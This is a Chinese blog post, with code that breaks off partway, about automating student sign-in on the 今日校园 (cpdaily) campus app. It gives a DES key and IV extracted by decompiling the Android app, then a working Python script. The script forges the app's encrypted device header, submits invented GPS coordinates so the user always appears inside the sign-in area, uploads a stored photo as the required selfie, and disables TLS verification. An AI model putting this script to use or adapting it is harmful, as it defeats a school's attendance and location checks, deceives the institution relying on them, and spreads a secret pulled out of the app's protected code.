    <content type="html"><![CDATA[<p>本文将探讨如何对今日校园发起的签到进行定时回应，即自动签到，同时了解使用Python进行阿里云oss的文件上传、Python的DES加解密库、逆向分析Android应用获取关键信息（本文涉及DES加解密的密钥和IV向量的获取）等</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上一篇文章中，我们讨论了如何进行今日校园的自诊打卡，但是后面经过测试发现，如果手机端重新登录，则原有的<code>Cookie</code>将失效，需要重新更新<code>Cookie</code>，所以最好在手机端登录后将<code>Cookie</code>填入程序里后，不要再退出登录，这样自动打卡就可以一直进行。而这篇今日校园自动签到，将不存在这一问题。当Cookie已经失效时，将自动进行重新登陆以更新<code>Cookie</code>，同时还可自定义签到位置，使你一直在其签到范围内</p><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="阿里云OSS上传文件"><a href="#阿里云OSS上传文件" class="headerlink" title="阿里云OSS上传文件"></a>阿里云OSS上传文件</h2><p>今日校园里面的签到很多时候都是需要自拍的，而这些图片会被今日校园保存到阿里云OSS中，所以我们必须实现Python使用阿里云OSS的过程</p><ol><li><p><code>pip install oss2</code></p></li><li><p>你需要有如下数据：</p><p><code>access_key_id</code>、<code>access_key_secret</code>、<code>endPoint</code>、<code>bucket</code></p><p>本文的这些数据均通过抓包获得</p></li><li><p>编写代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadPic</span><span class="params">(session)</span>:</span></span><br><span class="line">   <span class="string">"""</span></span><br><span class="line"><span class="string">   上传图片到阿里云oss</span></span><br><span class="line"><span class="string">   url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess'  # 用于获取主要参数</span></span><br><span class="line"><span class="string">   method: POST</span></span><br><span class="line"><span class="string">   :param session: requests.session()</span></span><br><span class="line"><span class="string">   :return: oss上的filename</span></span><br><span class="line"><span class="string">   """</span></span><br><span class="line">   <span class="comment"># 抓包获取文件上传所需信息</span></span><br><span class="line">   url = <span class="string">'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess'</span></span><br><span class="line">   res = session.post(url=url, verify=<span class="keyword">False</span>)</span><br><span class="line">   datas = res.json().get(<span class="string">'datas'</span>)</span><br><span class="line">   <span class="comment"># 所需信息</span></span><br><span class="line">   filename = datas.get(<span class="string">'fileName'</span>)</span><br><span class="line">   accessKeyId = datas.get(<span class="string">'accessKeyId'</span>)</span><br><span class="line">   accessSecret = datas.get(<span class="string">'accessKeySecret'</span>)</span><br><span class="line">   securityToken = datas.get(<span class="string">'securityToken'</span>)</span><br><span class="line">   endPoint = datas.get(<span class="string">'endPoint'</span>)</span><br><span class="line">   bucket = datas.get(<span class="string">'bucket'</span>)</span><br><span class="line">   <span class="comment"># 创建对象</span></span><br><span class="line">   bucket = oss2.Bucket(oss2.Auth(access_key_id=accessKeyId, access_key_secret=accessSecret), endPoint, bucket)</span><br><span class="line">   <span class="comment"># 读取home.jpg并上传到oss上的filename</span></span><br><span class="line">   <span class="keyword">with</span> open(<span class="string">'home.jpg'</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">      data = f.read()</span><br><span class="line">   bucket.put_object(key=filename, headers=&#123;<span class="string">'x-oss-security-token'</span>: securityToken&#125;, data=data)</span><br><span class="line">   <span class="comment"># 返回值为链接，参数依次为，方法、oss上文件路径、过期时间(s)</span></span><br><span class="line">   ret = bucket.sign_url(<span class="string">'PUT'</span>, filename, <span class="number">60</span>)</span><br><span class="line">   <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure></li></ol><h2 id="DES加解密"><a href="#DES加解密" class="headerlink" title="DES加解密"></a>DES加解密</h2><p>反编译该App的部分代码可以看出，今日校园许多关键信息均使用DES加密，且加密所需的IV向量为byte类型的数组<code>{1,2,3,4,5,6,7,8}</code>：</p><p><img src="/2020/03/25/今日校园自动签到/java-1.jpg" alt="java-1" style="zoom:50%;"></p><p>所以，我们提交这些信息也必须经过加密，而DES加密的密钥也能从相应的代码中分析得到:<code>ST83=@XV</code></p><p><img src="/2020/03/25/今日校园自动签到/java-2.jpg" alt="java-2" style="zoom:50%;"></p><p>在最新的<code>v8.1.12</code>更新日志中，提到了对软件的安全机制进行了加强：</p><p><img src="/2020/03/25/今日校园自动签到/update-log.png" alt="update-log"></p><p>经过分析，发现确实如此，今日校园App开始使用360加固进行安全防护，但在我之前使用的<code>v8.1.7</code>中，是可以直接分析其没有经过加固的代码的。而对于360加固过的应用如何进行逆向分析不是本文的重点，有机会将在以后的文章中进行讨论如何对其脱壳</p><p>所以在得到这些关键信息后就可进行DES加密部分的代码编写了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install pyDes</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, key=<span class="string">'ST83=@XV'</span>)</span>:</span></span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line">key = key</span><br><span class="line">iv = <span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08"</span></span><br><span class="line">k = des(key, CBC, iv, pad=<span class="keyword">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">EncryptStr = k.encrypt(s)</span><br><span class="line"><span class="keyword">return</span> base64.b64encode(EncryptStr).decode()</span><br></pre></td></tr></table></figure><h2 id="其他文件"><a href="#其他文件" class="headerlink" title="其他文件"></a>其他文件</h2><ol><li><p><code>config.ini</code></p><p>为了实现自动登录，我们需要一个名为<code>config.ini</code>的文件保存我们的<code>Cookie</code>，以便在未失效时直接使用，在失效时更新。<strong>该文件只保存<code>MOD_AUTH_CAS</code>字段的内容</strong></p></li><li><p><code>home.jpg</code></p><p>除此之外，还需要一张你的签到图片<code>home.jpg</code>，以便在签到时上传该文件</p></li></ol><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oss2</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.utils <span class="keyword">import</span> dict_from_cookiejar</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line"><span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 8.1.0; 16th Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.110 Mobile Safari/537.36 yiban/8.1.7 cpdaily/8.1.7 wisedu/8.1.7'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处配置你的账号</span></span><br><span class="line">USERCODE = <span class="string">'201707060000'</span></span><br><span class="line"><span class="comment"># 此处配置你的密码</span></span><br><span class="line">USERPWD = <span class="string">'123456'</span></span><br><span class="line"><span class="comment"># 此处填写最新的App版本</span></span><br><span class="line">APP_VERSION = <span class="string">'8.1.12'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 签到模式 custom：自定义位置；auto: 自动获取第一个签到范围内的位置</span></span><br><span class="line">MOD = <span class="string">'custom'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处填写你的签到地址信息</span></span><br><span class="line">POSITION = <span class="string">'中国山东省潍坊市寿光市'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当签到模式为custom时有效</span></span><br><span class="line"><span class="comment"># 此处填写地址经纬度</span></span><br><span class="line">LON = <span class="number">118.785300</span></span><br><span class="line">LAT = <span class="number">36.889072</span></span><br><span class="line"><span class="comment"># 如果准备签到的位置在签到范围外，则在此处填写原因</span></span><br><span class="line">REASON = <span class="string">'原因'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># des加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, key=<span class="string">'ST83=@XV'</span>)</span>:</span></span><br><span class="line">key = key</span><br><span class="line">iv = <span class="string">b"\x01\x02\x03\x04\x05\x06\x07\x08"</span></span><br><span class="line">k = des(key, CBC, iv, pad=<span class="keyword">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">EncryptStr = k.encrypt(s)</span><br><span class="line"><span class="keyword">return</span> base64.b64encode(EncryptStr).decode()  <span class="comment"># 转base64编码返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createCpdailyInfo</span><span class="params">(lon, lat, open_id)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">headers中的CpdailyInfo参数</span></span><br><span class="line"><span class="string">:param lon: 定位经度</span></span><br><span class="line"><span class="string">:param lat: 定位纬度</span></span><br><span class="line"><span class="string">:param open_id: 学生学号</span></span><br><span class="line"><span class="string">:return: CpdailyInfo</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">s = <span class="string">r'&#123;"systemName":"android","systemVersion":"8.1.0","model":"16th",'</span> \</span><br><span class="line">    <span class="string">r'"deviceId":"ffd1df5b-e69a-4938-9624-38d575039f83","appVersion":"8.1.11","lon":'</span> + str(</span><br><span class="line">lon) + <span class="string">',"lat":'</span> + str(lat) + <span class="string">',"userId":"'</span> + open_id + <span class="string">'"&#125;'</span></span><br><span class="line">info = encrypt(s)</span><br><span class="line"><span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadPic</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">上传图片到阿里云oss</span></span><br><span class="line"><span class="string">url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess'</span></span><br><span class="line"><span class="string">method: POST</span></span><br><span class="line"><span class="string">:return: oss上的filename</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url = <span class="string">'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess'</span></span><br><span class="line">res = session.post(url=url, verify=<span class="keyword">False</span>)</span><br><span class="line">datas = res.json().get(<span class="string">'datas'</span>)</span><br><span class="line">filename = datas.get(<span class="string">'fileName'</span>)</span><br><span class="line">accessKeyId = datas.get(<span class="string">'accessKeyId'</span>)</span><br><span class="line">accessSecret = datas.get(<span class="string">'accessKeySecret'</span>)</span><br><span class="line">securityToken = datas.get(<span class="string">'securityToken'</span>)</span><br><span class="line">endPoint = datas.get(<span class="string">'endPoint'</span>)</span><br><span class="line">bucket = datas.get(<span class="string">'bucket'</span>)</span><br><span class="line"><span class="comment"># 创建对象</span></span><br><span class="line">bucket = oss2.Bucket(oss2.Auth(access_key_id=accessKeyId, access_key_secret=accessSecret), endPoint, bucket)</span><br><span class="line"><span class="comment"># 读取test.jpg并上传到oss上的filename</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'home.jpg'</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line">bucket.put_object(key=filename, headers=&#123;<span class="string">'x-oss-security-token'</span>: securityToken&#125;, data=data)</span><br><span class="line"><span class="comment"># 返回值为链接，参数依次为，方法、oss上文件路径、过期时间(s)</span></span><br><span class="line">ret = bucket.sign_url(<span class="string">'PUT'</span>, filename, <span class="number">60</span>)</span><br><span class="line"><span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSignInfoInOneDay</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">:url: https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStuSignInfosInOneDay</span></span><br><span class="line"><span class="string">:method: POST</span></span><br><span class="line"><span class="string">:data: &#123;&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url = <span class="string">'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStuSignInfosInOneDay'</span></span><br><span class="line">data = json.dumps(&#123;&#125;)</span><br><span class="line">res = session.post(url=url, data=data, allow_redirects=<span class="keyword">False</span>, verify=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">print(<span class="string">'登录过期'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">datas = res.json().get(<span class="string">'datas'</span>, &#123;&#125;)</span><br><span class="line">signedTasks = datas.get(<span class="string">'signedTasks'</span>)</span><br><span class="line">unSignedTasks = datas.get(<span class="string">'unSignedTasks'</span>)</span><br><span class="line"></span><br><span class="line">tasks = &#123;<span class="string">'signedTasks'</span>: signedTasks, <span class="string">'unSignedTasks'</span>: unSignedTasks&#125;</span><br><span class="line"><span class="keyword">return</span> tasks</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSignDetail</span><span class="params">(us_task)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">签到任务详情</span></span><br><span class="line"><span class="string">url: https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/detailSignInstance</span></span><br><span class="line"><span class="string">method: POST</span></span><br><span class="line"><span class="string">:param us_task: 未签到的任务</span></span><br><span class="line"><span class="string">data: &#123;</span></span><br><span class="line"><span class="string">signInstanceWid: signInstanceWid,</span></span><br><span class="line"><span class="string">signWid: signWid</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">data-type: json</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url = <span class="string">'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/detailSignInstance'</span></span><br><span class="line">data = json.dumps(&#123;</span><br><span class="line"><span class="string">'signInstanceWid'</span>: us_task.get(<span class="string">'signInstanceWid'</span>),</span><br><span class="line"><span class="string">'signWid'</span>: us_task.get(<span class="string">'signWid'</span>),</span><br><span class="line">&#125;)</span><br><span class="line">res = session.post(url=url, data=data, verify=<span class="keyword">False</span>)</span><br><span class="line">unSignedTaskDetail = res.json().get(<span class="string">'datas'</span>)</span><br><span class="line"><span class="keyword">return</span> unSignedTaskDetail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPhotoUrl</span><span class="params">(filename)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">获取图片上传位置</span></span><br><span class="line"><span class="string">url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/previewAttachment'</span></span><br><span class="line"><span class="string">method: POST</span></span><br><span class="line"><span class="string">:param filename: 文件路径</span></span><br><span class="line"><span class="string">data: &#123;ossKey: 文件路径&#125;</span></span><br><span class="line"><span class="string">data-type: json</span></span><br><span class="line"><span class="string">:return: 图片上传位置</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url = <span class="string">'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/previewAttachment'</span></span><br><span class="line">data = json.dumps(&#123;</span><br><span class="line"><span class="string">'ossKey'</span>: filename</span><br><span class="line">&#125;)</span><br><span class="line">res = session.post(url=url, data=data, verify=<span class="keyword">False</span>)</span><br><span class="line">photoUrl = res.json().get(<span class="string">'datas'</span>)</span><br><span class="line"><span class="keyword">return</span> photoUrl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submitSign</span><span class="params">(wid, lon, lat, reason, photo_url, position)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">提交签到</span></span><br><span class="line"><span class="string">url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/submitSign'</span></span><br><span class="line"><span class="string">method: POST</span></span><br><span class="line"><span class="string">:param wid: 任务id string</span></span><br><span class="line"><span class="string">:param lon: 经度 float</span></span><br><span class="line"><span class="string">:param lat: 纬度 float</span></span><br><span class="line"><span class="string">:param reason: 补充原因 string</span></span><br><span class="line"><span class="string">:param photo_url: 签到图片url string</span></span><br><span class="line"><span class="string">:param position: 位置信息 string</span></span><br><span class="line"><span class="string">:return:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url = <span class="string">'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/submitSign'</span></span><br><span class="line">data = json.dumps(&#123;</span><br><span class="line"><span class="string">'signInstanceWid'</span>: wid,</span><br><span class="line"><span class="string">'longitude'</span>: lon,</span><br><span class="line"><span class="string">'latitude'</span>: lat,</span><br><span class="line"><span class="string">'isMalposition'</span>: <span class="number">1</span>,</span><br><span class="line"><span class="string">'abnormalReason'</span>: reason,</span><br><span class="line"><span class="string">'signPhotoUrl'</span>: photo_url,</span><br><span class="line"><span class="string">'position'</span>: position</span><br><span class="line">&#125;)</span><br><span class="line">cpdaily_extension = createCpdailyInfo(lon=lon, lat=lat, open_id=USERCODE)</span><br><span class="line">session.headers[<span class="string">'Content-Type'</span>] = <span class="string">'application/json;charset=UTF-8'</span></span><br><span class="line">res = session.post(url=url, headers=&#123;<span class="string">'Cpdaily-Extension'</span>: cpdaily_extension&#125;, data=data, verify=<span class="keyword">False</span>)</span><br><span class="line">message = res.json().get(<span class="string">'message'</span>)</span><br><span class="line"><span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">startSign</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">签到流程控制</span></span><br><span class="line"><span class="string">:return:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">tasks = getSignInfoInOneDay()</span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> tasks <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line"><span class="keyword">if</span> reLogin():</span><br><span class="line">print(<span class="string">'==&gt;重新登陆成功'</span>)</span><br><span class="line">text += <span class="string">'==&gt;重新登陆成功'</span></span><br><span class="line">mod = dict_from_cookiejar(session.cookies).get(<span class="string">'MOD_AUTH_CAS'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'cookie.ini'</span>, <span class="string">'w+'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(mod)</span><br><span class="line">session.cookies[<span class="string">'MOD_AUTH_CAS'</span>] = mod</span><br><span class="line">tasks = getSignInfoInOneDay()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">text += <span class="string">'==&gt;账号或密码错误、或者需要验证码'</span></span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line">unSignedTasks = tasks.get(<span class="string">'unSignedTasks'</span>)</span><br><span class="line"><span class="keyword">if</span> unSignedTasks:</span><br><span class="line">print(<span class="string">'当前有&#123;&#125;条签到'</span>.format(len(unSignedTasks)))</span><br><span class="line">print(<span class="string">'开始签到'</span>)</span><br><span class="line"><span class="keyword">for</span> unSignedTask <span class="keyword">in</span> unSignedTasks:</span><br><span class="line">unSignedDetailTask = getSignDetail(us_task=unSignedTask)</span><br><span class="line"><span class="comment"># 判断是否在签到时间</span></span><br><span class="line">currentTime = unSignedDetailTask.get(<span class="string">'currentTime'</span>)</span><br><span class="line">taskDate = unSignedDetailTask.get(<span class="string">'rateSignDate'</span>)[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">taskStartTime = unSignedDetailTask.get(<span class="string">'rateTaskBeginTime'</span>)</span><br><span class="line">taskEndTime = unSignedDetailTask.get(<span class="string">'rateTaskEndTime'</span>)</span><br><span class="line">dt1 = <span class="string">'&#123;&#125; &#123;&#125;'</span>.format(taskDate, taskStartTime)</span><br><span class="line">dt2 = <span class="string">'&#123;&#125; &#123;&#125;'</span>.format(taskDate, taskEndTime)</span><br><span class="line">timeArray1 = time.strptime(dt1, <span class="string">'%Y-%m-%d %H:%M'</span>)</span><br><span class="line">timeArray2 = time.strptime(dt2, <span class="string">'%Y-%m-%d %H:%M'</span>)</span><br><span class="line">timeArray3 = time.strptime(currentTime, <span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br><span class="line">timestamp1 = time.mktime(timeArray1)</span><br><span class="line">timestamp2 = time.mktime(timeArray2)</span><br><span class="line">timestamp3 = time.mktime(timeArray3)</span><br><span class="line"><span class="keyword">if</span> timestamp3 &lt;= timestamp1 <span class="keyword">or</span> timestamp3 &gt;= timestamp2:</span><br><span class="line">print(<span class="string">"未到签到时间"</span>)</span><br><span class="line">text += <span class="string">'==&gt;未到签到时间'</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">filename = uploadPic()</span><br><span class="line">photo_url = getPhotoUrl(filename=filename)</span><br><span class="line"><span class="comment"># 地址信息</span></span><br><span class="line">reason = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> MOD == <span class="string">'custom'</span>:</span><br><span class="line">longitude = LON</span><br><span class="line">latitude = LAT</span><br><span class="line">reason = REASON</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">place = unSignedDetailTask.get(<span class="string">'signPlaceSelected'</span>)[<span class="number">0</span>]</span><br><span class="line">longitude = place.get(<span class="string">'longitude'</span>)</span><br><span class="line">latitude = place.get(<span class="string">'latitude'</span>)</span><br><span class="line">text += <span class="string">"==&gt;"</span> + submitSign(wid=unSignedDetailTask.get(<span class="string">'signInstanceWid'</span>), lon=longitude, lat=latitude, reason=reason, photo_url=photo_url, position=POSITION)</span><br><span class="line">session.get(<span class="string">'https://sc.ftqq.com/**********你server酱的SCKEY**********.send?text=今日校园签到&amp;desp='</span> + text)</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"暂时没有签到任务"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="string">'==&gt;暂时没有签到任务'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reLogin</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">重新登陆</span></span><br><span 